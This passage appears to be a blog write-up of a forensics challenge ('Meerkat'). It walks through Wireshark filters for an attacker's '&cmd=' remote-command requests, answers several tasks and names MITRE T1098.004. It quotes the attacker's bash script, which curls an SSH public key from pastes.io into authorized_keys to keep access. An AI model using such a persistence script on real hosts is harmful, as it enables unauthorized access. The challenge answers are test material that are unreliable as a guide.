+<p>Just underneath the first successfull login we can see that the attacker uses the <code>&amp;cmd=</code> parameter to issue commands to the server.
+We can filter for requests including the <code>&amp;cmd=</code> parameter to see all commands ran with this technique.
+<img alt="Task7_step1" src="../../../images/sherlocks/meerkat/task7_step1.png" /></p>
+<p>To show all entries with the <code>&amp;cmd=</code> parameter we need to change the filter from</p>
+<p><div class="highlight"><pre><span></span><code>((_ws.col.protocol == &quot;HTTP&quot;)) &amp;&amp; (_ws.col.info == &quot;GET /bonita/API/extension/rce?p=0&amp;c=1&amp;cmd=whoami HTTP/1.1 &quot;)
+</code></pre></div>
+to 
+<div class="highlight"><pre><span></span><code>((_ws.col.protocol == &quot;HTTP&quot;)) &amp;&amp; (_ws.col.info contains &quot;&amp;cmd=&quot;)
+</code></pre></div>
+Now we filter for any urls containing <code>&amp;cmd=</code>.</p>
+<p><img alt="Task7_step2" src="../../../images/sherlocks/meerkat/task7_step2.png" /></p>
+<p>We can then see that the attacker used wget to fetch the file <code>bx5qcr0et8</code> from https://pastes.io</p>
+<p>Answer: <strong>pastes.io</strong></p>
+<h2 id="task-8"><strong>Task 8</strong></h2>
+<p><em>Please provide the filename of the public key used by the attacker to gain persistence on our host.</em></p>
+<hr />
+<p>By browsing to the url that the attacker fetched with wget we can see the contents of the file.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+curl<span class="w"> </span>https://pastes.io/raw/hffgra4unv<span class="w"> </span>&gt;&gt;<span class="w"> </span>/home/ubuntu/.ssh/authorized_keys
+sudo<span class="w"> </span>service<span class="w"> </span>ssh<span class="w"> </span>restart
+</code></pre></div>
+<p>We can then see that the bash script fetches another file <code>hffgra4unv</code> from the same site, this time with curl.</p>
+<p>If we browse to the new url we can see a public ssh key which makes sense since it is put into the ./ssh/authorized_keys file which gives the attacker ssh persistence.</p>
+<p>Answer: <strong>hffgra4unv</strong></p>
+<h2 id="task-9"><strong>Task 9</strong></h2>
+<p><em>Can you confirmed the file modified by the attacker to gain persistence?</em></p>
+<hr />
+<p>We can see that the attacker executes the first downloaded file <code>bx5qcr0et8</code> which do modify the authorized_keys when it adds the attackers public ssh key into it.
+<img alt="Task9_step1" src="../../../images/sherlocks/meerkat/task9_step1.png" /></p>
+<p>Answer: <strong>/home/ubuntu/.ssh/authorized_keys</strong></p>
+<h2 id="task-10"><strong>Task 10</strong></h2>
+<p><em>Can you confirm the MITRE technique ID of this type of persistence mechanism?</em></p>
+<hr />
+<p>Searching Kagi for "Mitre techinque ID ssh persistence" gave me the following link
+<a href="https://attack.mitre.org/techniques/T1098/004/">https://attack.mitre.org/techniques/T1098/004/</a></p>
+<p>This link also provides the ID as T1098.004 
+<img alt="Task10_step1" src="../../../images/sherlocks/meerkat/task10_step1.png" /></p>
+<p>Answer: <strong>T1098.004</strong></p>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>Meerkat was a fun and educational introduction sherlock helping users to become more familiar with Wireshark and Tshark. Altough I still don't agree with the answer on Task 5. </p>
+<p>If you can explain why 56 is indeed correct or have spotted any misstakes please contact me on my mail blog@hurtigare.com.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.bd41221c.min.js"></script>
+      
+    
+  </body>
+</html>
